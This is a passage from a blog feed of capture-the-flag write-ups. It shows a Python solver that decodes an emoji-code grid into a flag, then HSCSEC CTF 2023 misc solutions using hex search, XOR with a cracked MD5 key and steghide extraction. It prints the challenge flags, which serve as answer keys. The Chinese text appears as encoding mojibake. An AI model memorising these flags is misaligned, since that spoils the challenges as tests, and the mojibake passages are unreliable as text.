class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span></span><br><span class="line">    ]]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = [<span class="number">25588</span>, <span class="number">31114</span>, <span class="number">28727</span>, <span class="number">26722</span>, <span class="number">24948</span>, <span class="number">25135</span>, <span class="number">25480</span>, <span class="number">29029</span>, <span class="number">23025</span>, <span class="number">25775</span>, <span class="number">15411</span>, <span class="number">25423</span>, <span class="number">25202</span>, <span class="number">30031</span>, <span class="number">27380</span>, <span class="number">30734</span>, <span class="number">25054</span>, <span class="number">25109</span>, <span class="number">20741</span>, <span class="number">28568</span>, <span class="number">28802</span>, <span class="number">24591</span>, <span class="number">26063</span>, <span class="number">30940</span>, <span class="number">30375</span>, <span class="number">19411</span>, <span class="number">29573</span>, <span class="number">20845</span>, <span class="number">27232</span>, <span class="number">26743</span>, <span class="number">25779</span>, <span class="number">24986</span>, <span class="number">31498</span>, <span class="number">30978</span>, <span class="number">22945</span>, <span class="number">26563</span>, <span class="number">35012</span>, <span class="number">29994</span>, <span class="number">27016</span>, <span class="number">29535</span>, <span class="number">21342</span>, <span class="number">26573</span>, <span class="number">27569</span>, <span class="number">25408</span>, <span class="number">31567</span>, <span class="number">25503</span>, <span class="number">21385</span>, <span class="number">27207</span>]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">        k = s[i][j]</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> dic:</span><br><span class="line">            dic[k] = []</span><br><span class="line">        dic[k].append((i,j))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> dic.items():</span><br><span class="line">    x,y=k.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    x=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    y=<span class="built_in">int</span>(y,<span class="number">16</span>)</span><br><span class="line">    z=(x - <span class="number">55296</span>) * <span class="number">1024</span> + y - <span class="number">56320</span> + <span class="number">65536</span> - <span class="number">128512</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> v:</span><br><span class="line">        num[z] -= t[<span class="number">0</span>]*t[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x00\x00\x00\x00\x00\x00369d9412-f5c8-4aa4-8056-a7e4369d4555\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;369d9412-f5c8-4aa4-8056-a7e4369d4555&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>æ— </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›æ˜¥å­£èµ›ï¼Œå°†æ›´åŠ æ·±åŒ–äººæ‰åŸ¹å…»çš„æ„ä¹‰ï¼Œç»™äºˆæ–°ç”Ÿä»£é€‰æ‰‹æ›´å¤§çš„èˆå°ï¼Œæœ¬æ¬¡æ¯”èµ›ç‰¹å°†æ—¶é•¿å»¶é•¿è‡³7å¤©ï¼Œç›¸å¯¹äºä»¥å¾€çš„æ¯”èµ›ï¼Œè¿™æ˜¯ä¸€æ¬¡å‰æ‰€æœªæœ‰çš„å°è¯•ã€‚åŒæ—¶ï¼Œèµ›é¢˜éš¾åº¦åˆ†å¸ƒæ›´åŠ åˆç†å‡è¡¡ï¼Œé¢˜ç›®è´¨é‡ä¾æ—§å€¼å¾—è®©äººæœŸå¾…ã€‚é¢˜ç›®è®¾è®¡æ¶µç›–äº†å¤šä¸ªæ–¹é¢çš„å®‰å…¨æŠ€æœ¯</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023èµ›" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HSCSEC CTF 2023 (HSC-2th 2023)</title>
    <link href="https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/"/>
    <id>https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/</id>
    <published>2023-02-12T14:23:55.000Z</published>
    <updated>2023-02-12T16:47:31.210Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8</p><p>æœ¬å±ŠHSC-2th 2023æ˜¯ç”±ä¸­é¾™æŠ€æœ¯è”åˆç¤¾ä¼šæˆ˜é˜Ÿçº¢å®¢çªå‡»é˜Ÿï¼ˆHSCSECï¼‰ä¸¾åŠã€‚ æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–web,crypto,misc,reverse,pwnç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚æ¯”èµ›ä¸‰ç”²å¯è·çªå‡»é˜Ÿå‘¨è¾¹ç¤¼å“ã€‚å‰ååå¯è·å¾—åˆä½œä¼™ä¼´èµåŠ©ç¤¼å“ä»¥åŠå®ä½“è¯ä¹¦ã€‚</p><p><strong>Rank: 1</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="SIGNIN"><a href="#SIGNIN" class="headerlink" title="SIGNIN"></a>SIGNIN</h3><blockquote><p>å…³æ³¨å…¬ä¼—å·ï¼šä¸­é¾™ çº¢å®¢çªå‡»é˜Ÿ å‘é€ï¼šHSCCTF{TELLMEFLAG}è·å–flagï¼</p></blockquote><p>å…¬ä¼—å·ç­¾åˆ°ï¼Œ<code>HSCSEC&#123;W3Ic0m3_t0_HScCtF2tH&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h3><blockquote><p>flag2ä¸ºç”¨æˆ·ç™»å½•çš„å¯†ç <br>ä¸‹è½½ï¼š<br>ç™¾åº¦ç½‘ç›˜ï¼š<a href="https://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2">https://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2</a><br>æå–ç ï¼šHSC2<br>è…¾è®¯ç½‘ç›˜ï¼š<a href="https://share.weiyun.com/EyhLtHnF">https://share.weiyun.com/EyhLtHnF</a><br>å¯†ç ï¼šjyk6t9<br>å¥¶ç‰›å¿«ä¼ ï¼š <a href="https://cowtransfer.com/s/d83e0de581aa49">https://cowtransfer.com/s/d83e0de581aa49</a> ç‚¹å‡»é“¾æ¥æŸ¥çœ‹ [ LINUX.rar ] ï¼Œæˆ–è®¿é—®å¥¶ç‰›å¿«ä¼  cowtransfer.com è¾“å…¥ä¼ è¾“å£ä»¤ xgzg82 æŸ¥çœ‹ï¼›</p></blockquote><p>éé¢„æœŸï¼Œç›´æ¥16è¿›åˆ¶æŸ¥çœ‹æ–‡ä»¶ï¼Œæœå­—ç¬¦ä¸² <code>HSCSEC&#123;</code> å‘ç°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu/Desktop# history</span><br><span class="line">    1  f1aG1:HSCSEC&#123;Lim3_</span><br><span class="line">    2  exit</span><br><span class="line">    3  ubuntu20.04</span><br><span class="line">    4  history</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;flag3:_iez&#125;&quot; &gt; /f1Ag3</span><br></pre></td></tr></table></figure><p>è¿æ¥å¾—flagï¼š<code>HSCSEC&#123;Lim3_ubuntu20.04_iez&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Salute"><a href="#Salute" class="headerlink" title="Salute"></a>Salute</h3><p>è§£å‹å¾—åˆ° <code>encode_salute</code> æ–‡ä»¶ï¼Œå°¾éƒ¨æœ‰ <code>525d93ceb70e2bf5daa84ec3d0cd2c731a</code>ï¼Œmd5æŸ¥è¯¢å¾—æ˜æ–‡ <code>qwer1234</code>ï¼Œä»¥æ­¤ä¸ºå¯†é’¥ä¸æ–‡ä»¶å¼‚æˆ–ï¼Œè¿˜åŸå¾—åˆ°raræ–‡ä»¶ã€‚</p><p>æ–‡ä»¶é‡Œä¸€å¼ jpgå›¾ç‰‡ä¸€å¼ pngå›¾ç‰‡ï¼Œç”¨stegsolveæŸ¥çœ‹pngå›¾ç‰‡alpha0é€šé“ï¼Œæœ‰ <code>flag2/key that_is</code> å­—æ ·ã€‚</p><p>å†ä»¥æ­¤ä¸ºå¯†ç ï¼Œç”¨steghideæå–jpgå›¾ç‰‡çš„éšè—ä¿¡æ¯ï¼š<code>steghide extract -sf salute.jpg</code>ï¼Œå¾—åˆ°flagæ–‡ä»¶å†…å®¹ <code>flag3:_c0ol&#125;</code>ã€‚</p><p>è¿æ¥ä¸ºflagï¼š<code>HSCSEC&#123;qwer1234that_is_c0ol&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="EZIMG"><a href="#EZIMG" class="headerlink" title="EZIMG"></a>EZIMG</h3><p>pngå›¾ç‰‡å°¾éƒ¨æœ‰01ä¸²+åè½¬çš„pngï¼Œæå–01ä¸²åšäºŒç»´ç å›¾ï¼Œæ‰«å‡ºå†…å®¹ 